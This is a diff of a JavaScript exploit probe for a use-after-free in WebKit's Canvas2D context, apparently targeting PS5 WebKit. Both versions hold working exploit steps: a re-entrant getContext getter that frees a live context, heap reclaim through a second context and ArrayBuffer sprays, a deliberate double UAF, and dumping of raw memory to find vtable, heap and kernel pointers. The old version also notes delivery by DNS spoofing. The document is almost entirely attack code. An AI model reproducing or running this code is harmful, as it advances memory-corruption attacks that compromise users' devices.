@@ -1,259 +1,241 @@
-// PROBE P568: ArrayBuffer reclaim of freed Canvas2D context (768B)
+// PROBE P568v12: Context-reclaim aliasing — use a LIVE context to survive
 //
-// GOAL: Trigger Canvas UAF (CVE-2026-43720), then spray 768-byte
-//       ArrayBuffers to reclaim the freed CanvasRenderingContext2D.
-//       Read raw bytes via DataView to extract any surviving pointers
-//       (bypasses DAZ since DataView uses integer paths, not FPU).
+// v11 confirmed: ALL C++ methods crash on zeroed ArrayBuffer spray.
+// beginPath, createLinearGradient, getContextAttributes — all crash.
+// Only webkitBackingStorePixelRatio survives (constant return 1).
 //
-// THEORY: ISO_MALLOC is OFF on PS5 WebKit. bmalloc should serve
-//         768B from the same size class for both Canvas2D and ArrayBuffer.
-//         If reclaim works, we get bidirectional raw byte R/W over
-//         the freed context's memory, including vtable and internal ptrs.
+// ROOT CAUSE: zeroed spray → null vtable, null m_canvas, null m_stateStack.
+// Every C++ code path accesses at least one of these → null deref → crash.
 //
-// DELIVERY: host.py DNS spoofing + HTTPS (User Guide redirect)
+// NEW APPROACH: Don't spray with ArrayBuffers. Instead, immediately after the
+// UAF, create a SECOND CanvasRenderingContext2D on a new canvas. bmalloc should
+// reclaim the just-freed 768B slot. Now inner aliases the new live context:
+// its vtable, m_canvas, m_stateStack are all VALID. Methods should WORK.
+//
+// Verification: set globalAlpha on the second context, read through inner.
+// If they match → confirmed aliasing → we have working methods on freed memory.
 
 (() => {
-  const B = (tag, extra = '') => {
-    new Image().src = '/beacon/P568-' + encodeURIComponent(tag) +
-      (extra ? '-' + encodeURIComponent(extra) : '') +
+  const L = window._p568log || function(){};
+  const B = (tag, extra) => {
+    const msg = 'P568v12-' + tag + (extra !== undefined ? '-' + extra : '');
+    new Image().src = '/beacon/' + encodeURIComponent(msg) +
       '?t=' + performance.now().toFixed(0);
+    L(msg);
   };
 
   B('BOOT');
 
-  // === PHASE A: Trigger Canvas UAF ===
-  // Re-entrant getContext frees the first context while inner still refs it
-  let inner = null;
-  let outer = null;
-
-  const canvas = document.createElement('canvas');
-  canvas.width = 300;
-  canvas.height = 150;
+  // === PHASE A: Trigger UAF ===
+  let inner = null, outer = null;
+  const canvas1 = document.createElement('canvas');
+  canvas1.width = 300; canvas1.height = 150;
+  document.body.appendChild(canvas1);
 
   const opts = {};
   Object.defineProperty(opts, 'desynchronized', {
-    get() {
-      // This creates context A and assigns it to the canvas
-      inner = canvas.getContext('2d');
-      return false;
-    }
+    get() { inner = canvas1.getContext('2d'); return false; }
   });
+  try { outer = canvas1.getContext('2d', opts); } catch(e) {
+    B('UAF-ERR', e.name); return;
+  }
+  if (!inner || !outer || inner === outer) { B('UAF-FAIL'); return; }
+  B('UAF-OK');
 
+  // === PHASE B: Reclaim with a SECOND live context (NOT ArrayBuffer) ===
+  // The freed 768B slot should be at the head of bmalloc's freelist.
+  // The next 768B allocation should reclaim it.
+  const canvas2 = document.createElement('canvas');
+  canvas2.width = 200; canvas2.height = 100;
+  document.body.appendChild(canvas2);
+  const ctx2 = canvas2.getContext('2d');
+  if (!ctx2) { B('CTX2-FAIL'); return; }
+  B('CTX2-OK');
+
+  // === PHASE C: Test if inner now aliases ctx2 ===
+  // If inner's memory is now ctx2's C++ object, methods should work.
+
+  // C1: Test globalAlpha (default = 1.0 on both)
+  B('TRY-GA');
+  let innerGA = null;
   try {
-    // This starts creating context B; during opts conversion, the getter
-    // fires and creates A. When B completes, A is replaced and freed.
-    // inner = dangling ref to freed A (768 bytes)
-    // outer = valid ref to B
-    outer = canvas.getContext('2d', opts);
-  } catch (e) {
-    B('UAF-ERR', e.name + ':' + e.message.slice(0, 60));
+    innerGA = inner.globalAlpha;
+    B('INNER-GA', '' + innerGA);
+  } catch(e) {
+    B('INNER-GA-ERR', e.name);
   }
 
-  if (!inner || !outer) {
-    B('UAF-FAIL', 'inner=' + !!inner + ',outer=' + !!outer);
-    return;
+  // C2: Set ctx2's globalAlpha to a distinctive value
+  ctx2.globalAlpha = 0.777;
+  B('CTX2-GA-SET', '0.777');
+
+  // C3: Read inner's globalAlpha — if aliased, should read 0.777
+  B('TRY-GA2');
+  try {
+    const ga2 = inner.globalAlpha;
+    B('INNER-GA2', '' + ga2);
+    if (Math.abs(ga2 - 0.777) < 0.001) {
+      B('ALIAS-CONFIRMED');
+    } else {
+      B('NO-ALIAS', 'got=' + ga2);
+    }
+  } catch(e) {
+    B('INNER-GA2-ERR', e.name);
   }
 
-  if (inner === outer) {
-    B('UAF-SAME', 'no-split');
-    return;
+  // === PHASE D: If aliased, test more methods ===
+  B('TRY-beginPath');
+  try {
+    inner.beginPath();
+    B('OK-beginPath');
+  } catch(e) { B('ERR-beginPath', e.name); }
+
+  B('TRY-moveTo');
+  try {
+    inner.moveTo(10, 10);
+    B('OK-moveTo');
+  } catch(e) { B('ERR-moveTo', e.name); }
+
+  B('TRY-lineTo');
+  try {
+    inner.lineTo(50, 50);
+    B('OK-lineTo');
+  } catch(e) { B('ERR-lineTo', e.name); }
+
+  B('TRY-lineWidth-set');
+  try {
+    inner.lineWidth = 3.0;
+    B('OK-lineWidth-set');
+  } catch(e) { B('ERR-lineWidth-set', e.name); }
+
+  B('TRY-lineWidth-get');
+  try {
+    const lw = inner.lineWidth;
+    B('INNER-LW', '' + lw);
+  } catch(e) { B('ERR-lineWidth-get', e.name); }
+
+  // Check if ctx2's lineWidth changed (proving bidirectional aliasing)
+  B('CTX2-LW', '' + ctx2.lineWidth);
+
+  // === PHASE E: Test factory methods (return DOM objects) ===
+  B('TRY-createLinearGradient');
+  try {
+    const g = inner.createLinearGradient(0, 0, 100, 100);
+    B('OK-createLinearGradient', g ? g.constructor.name : '' + g);
+  } catch(e) { B('ERR-createLinearGradient', e.name); }
+
+  B('TRY-createImageData');
+  try {
+    const id = inner.createImageData(4, 4);
+    B('OK-createImageData', id ? id.width + 'x' + id.height : '' + id);
+  } catch(e) { B('ERR-createImageData', e.name); }
+
+  B('TRY-getTransform');
+  try {
+    const t = inner.getTransform();
+    B('OK-getTransform', t ? 'a=' + t.a : '' + t);
+  } catch(e) { B('ERR-getTransform', e.name); }
+
+  // === PHASE F: Test getContextAttributes ===
+  B('TRY-GCA');
+  try {
+    const attrs = inner.getContextAttributes();
+    if (attrs && typeof attrs === 'object') {
+      const keys = Object.keys(attrs);
+      B('OK-GCA', keys.length + ':' + keys.join(','));
+      for (const k of keys) {
+        B('GCA-' + k, '' + attrs[k]);
+      }
+    } else {
+      B('OK-GCA', '' + attrs);
+    }
+  } catch(e) { B('ERR-GCA', e.name); }
+
+  // === PHASE G: Drawing test — draw through inner, read through ctx2 ===
+  B('TRY-DRAW');
+  try {
+    inner.fillStyle = 'red';
+    inner.fillRect(0, 0, 50, 50);
+    B('OK-DRAW');
+
+    // Read pixels from canvas2 to verify the draw landed there
+    const pixels = ctx2.getImageData(25, 25, 1, 1);
+    const r = pixels.data[0], g = pixels.data[1], b = pixels.data[2], a = pixels.data[3];
+    B('PIXEL', r + ',' + g + ',' + b + ',' + a);
+    // Red fill should show r=255, g=0, b=0, a=255
+  } catch(e) { B('ERR-DRAW', e.name); }
+
+  // === PHASE H: Second UAF — free ctx2's slot, spray ArrayBuffers ===
+  // This gives us raw byte access to the C++ object layout.
+  B('UAF2-START');
+  let inner2 = null, outer2 = null;
+  const opts2 = {};
+  Object.defineProperty(opts2, 'desynchronized', {
+    get() { inner2 = canvas2.getContext('2d'); return false; }
+  });
+  try { outer2 = canvas2.getContext('2d', opts2); } catch(e) {
+    B('UAF2-ERR', e.name); return;
   }
+  if (!inner2 || !outer2 || inner2 === outer2) { B('UAF2-FAIL'); return; }
+  B('UAF2-OK');
+  // inner2 and inner both pointed to the freed C++ object of ctx2
+  // (inner still points there, inner2 also points there)
 
-  B('UAF-OK', 'inner!=outer');
-
-  // === PHASE B: Spray 768-byte ArrayBuffers to reclaim freed slot ===
-  const SPRAY_COUNT = 512;
-  const TARGET_SIZE = 768;
+  // Spray ArrayBuffers to reclaim the twice-freed slot
+  const COUNT = 128;
+  const SIZE = 768;
   const spray = [];
+  for (let i = 0; i < COUNT; i++) spray.push(new ArrayBuffer(SIZE));
+  B('SPRAY2', COUNT);
 
-  // Fill each buffer with a recognizable pattern so we can detect reclaim
-  for (let i = 0; i < SPRAY_COUNT; i++) {
-    const ab = new ArrayBuffer(TARGET_SIZE);
-    const dv = new DataView(ab);
-    // Write tag pattern: each qword = 0xBBBB0000 | index
-    for (let off = 0; off < TARGET_SIZE; off += 8) {
-      dv.setUint32(off, 0xBBBB0000 | i, true);
-      dv.setUint32(off + 4, 0xAAAAAAAA, true);
+  // === PHASE I: Read the C++ object layout from spray buffers ===
+  // Find which spray buffer has non-zero data (the one that reclaimed the slot)
+  let overlapIdx = -1;
+  for (let i = 0; i < COUNT; i++) {
+    const u8 = new Uint8Array(spray[i]);
+    let nonzero = 0;
+    for (let j = 0; j < SIZE; j++) {
+      if (u8[j] !== 0) { nonzero++; break; }
     }
-    spray.push({ ab, dv });
-  }
-
-  B('SPRAY-DONE', SPRAY_COUNT + 'x' + TARGET_SIZE);
-
-  // === PHASE C: Probe the dangling inner context ===
-  // If an ArrayBuffer reclaimed the freed memory, writing through inner
-  // should corrupt the ArrayBuffer's data, and vice versa.
-
-  // First, read canvas properties through inner (the dangling ref)
-  // These access the freed memory; if reclaimed by our spray, they
-  // will read our tag pattern instead of valid context fields
-  let probeResults = {};
-  try {
-    // fillStyle getter reads from the context object
-    probeResults.fillStyle = inner.fillStyle;
-    B('INNER-FILL', String(probeResults.fillStyle).slice(0, 40));
-  } catch (e) {
-    B('INNER-FILL-ERR', e.name);
-  }
-
-  try {
-    probeResults.globalAlpha = inner.globalAlpha;
-    B('INNER-ALPHA', String(probeResults.globalAlpha));
-  } catch (e) {
-    B('INNER-ALPHA-ERR', e.name);
-  }
-
-  try {
-    probeResults.lineWidth = inner.lineWidth;
-    B('INNER-LINEWIDTH', String(probeResults.lineWidth));
-  } catch (e) {
-    B('INNER-LINEWIDTH-ERR', e.name);
-  }
-
-  // === PHASE D: Write through inner, check spray for corruption ===
-  // If inner's memory is now an ArrayBuffer, setting fillStyle should
-  // modify bytes in one of our spray buffers
-  try {
-    inner.fillStyle = '#ff0000';
-    B('INNER-WRITE-OK');
-  } catch (e) {
-    B('INNER-WRITE-ERR', e.name);
-  }
-
-  // Check all spray buffers for corruption (any byte not matching our tag)
-  let corruptCount = 0;
-  let corruptIdx = -1;
-  let corruptDetails = '';
-
-  for (let i = 0; i < spray.length; i++) {
-    const dv = spray[i].dv;
-    let clean = true;
-    for (let off = 0; off < TARGET_SIZE; off += 8) {
-      const lo = dv.getUint32(off, true);
-      const hi = dv.getUint32(off + 4, true);
-      if (lo !== (0xBBBB0000 | i) || hi !== 0xAAAAAAAA) {
-        clean = false;
-        if (corruptCount < 3) {
-          corruptDetails += 'i=' + i + ',off=' + off +
-            ',lo=' + lo.toString(16) + ',hi=' + hi.toString(16) + ';';
-        }
-        break;
-      }
-    }
-    if (!clean) {
-      corruptCount++;
-      if (corruptIdx === -1) corruptIdx = i;
+    if (nonzero > 0) {
+      overlapIdx = i;
+      break;
     }
   }
 
-  B('CORRUPT', corruptCount + '/' + spray.length + ',first=' + corruptIdx);
-  if (corruptDetails) B('CORRUPT-DETAIL', corruptDetails);
-
-  // === PHASE E: If corruption found, dump the reclaimed buffer ===
-  if (corruptIdx >= 0) {
-    B('RECLAIM-HIT');
-    const dv = spray[corruptIdx].dv;
-
-    // Dump first 128 bytes as hex (potential vtable, pointers)
-    for (let off = 0; off < 128 && off < TARGET_SIZE; off += 8) {
-      let hex;
-      try {
-        // Try BigUint64Array path first (bypasses DAZ completely)
-        const tmp = new BigUint64Array(spray[corruptIdx].ab, off, 1);
-        hex = tmp[0].toString(16).padStart(16, '0');
-      } catch (_) {
-        // Fallback to DataView getUint32 pairs
-        const lo = dv.getUint32(off, true);
-        const hi = dv.getUint32(off + 4, true);
-        hex = hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
-      }
-      B('DUMP', '+' + off.toString(16) + ':' + hex);
-    }
-
-    // Check for kernel-range pointers (0xFFFF8xxx_xxxxxxxx)
-    for (let off = 0; off < TARGET_SIZE; off += 8) {
-      const hi = dv.getUint32(off + 4, true);
-      if ((hi & 0xFFFF8000) === 0xFFFF8000 && hi !== 0xFFFFFFFF) {
-        const lo = dv.getUint32(off, true);
-        B('KPTR', '+' + off.toString(16) + ':' +
-          hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
-      }
-    }
-
-    // Check for heap-range pointers (0x000000xx_xxxxxxxx, high byte < 0x80)
-    for (let off = 0; off < TARGET_SIZE; off += 8) {
-      const hi = dv.getUint32(off + 4, true);
-      if (hi > 0 && hi < 0x00008000 && hi !== 0xAAAAAAAA) {
-        const lo = dv.getUint32(off, true);
-        if (lo !== (0xBBBB0000 | corruptIdx)) {
-          B('HPTR', '+' + off.toString(16) + ':' +
-            hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
-        }
-      }
-    }
-
-    // === PHASE F: Write a marker through the ArrayBuffer, read via inner ===
-    // Write known float64 values at key offsets, then read them via inner
-    // to confirm bidirectional access
+  if (overlapIdx >= 0) {
+    B('OVERLAP', overlapIdx);
+    // Dump first 128 bytes as hex via BigUint64Array
     try {
-      // globalAlpha is stored as a double at some offset in the context
-      // Write 0.12345 pattern at offset 0 and every 8B, see what inner reads
-      const marker = 0.123456789;
-      for (let off = 0; off < TARGET_SIZE; off += 8) {
-        const f64 = new Float64Array(spray[corruptIdx].ab, off, 1);
-        f64[0] = marker;
+      const u64 = new BigUint64Array(spray[overlapIdx]);
+      const ptrs = [];
+      for (let j = 0; j < 16; j++) {
+        ptrs.push(u64[j].toString(16));
       }
-      // Now read through inner
-      const readAlpha = inner.globalAlpha;
-      const readWidth = inner.lineWidth;
-      B('BIDI-CHECK', 'alpha=' + readAlpha + ',width=' + readWidth);
-    } catch (e) {
-      B('BIDI-ERR', e.name);
-    }
+      B('HEX-0', ptrs.slice(0, 8).join(','));
+      B('HEX-64', ptrs.slice(8, 16).join(','));
+    } catch(e) { B('HEX-ERR', e.name); }
   } else {
-    B('NO-RECLAIM', 'spray-miss');
+    B('NO-OVERLAP', 'all-zero');
 
-    // === PHASE G: Try different sizes near 768 ===
-    // bmalloc size classes may round 768 differently than we expect
-    const altSizes = [752, 760, 768, 776, 784, 800, 832, 896, 1024];
-    for (const sz of altSizes) {
-      // Trigger a fresh UAF for each size test
-      const c2 = document.createElement('canvas');
-      c2.width = 100;
-      c2.height = 100;
-      let in2 = null;
-      const o2 = {};
-      Object.defineProperty(o2, 'desynchronized', {
-        get() { in2 = c2.getContext('2d'); return false; }
-      });
-      try {
-        c2.getContext('2d', o2);
-      } catch (_) {}
-
-      if (!in2) continue;
-
-      // Spray at this size
-      const alt = [];
-      for (let i = 0; i < 256; i++) {
-        const ab = new ArrayBuffer(sz);
-        const u8 = new Uint8Array(ab);
-        u8.fill(0xCC);
-        alt.push(ab);
-      }
-
-      // Check if inner reads garbage (reclaimed)
-      try {
-        const a = in2.globalAlpha;
-        if (a !== 1.0) {
-          B('ALT-HIT', 'sz=' + sz + ',alpha=' + a);
-        }
-      } catch (e) {
-        B('ALT-ERR', 'sz=' + sz + ',' + e.name);
-      }
+    // Alternative: use webkitBackingStorePixelRatio on inner to confirm
+    // reclaim still works, then write markers to find the buffer
+    B('MARKER-SCAN');
+    for (let i = 0; i < COUNT; i++) {
+      // Write unique marker at offset 100 (unlikely to be a critical field)
+      new Uint8Array(spray[i])[100] = i + 1;
     }
-    B('ALT-SCAN-DONE');
+    // Check if webkitBackingStorePixelRatio still works on inner
+    try {
+      const val = inner.webkitBackingStorePixelRatio;
+      B('WBSPR-AFTER', '' + val);
+    } catch(e) { B('WBSPR-ERR', e.name); }
   }
+
+  // === PHASE J: Outer contexts alive check ===
+  B('OUTER-CHECK');
+  try { B('OUTER1-GA', '' + outer.globalAlpha); } catch(e) { B('OUTER1-ERR', e.name); }
+  try { B('OUTER2-GA', '' + outer2.globalAlpha); } catch(e) { B('OUTER2-ERR', e.name); }
 
   B('DONE');
-  setTimeout(() => B('ALIVE-5s'), 5000);
 })();
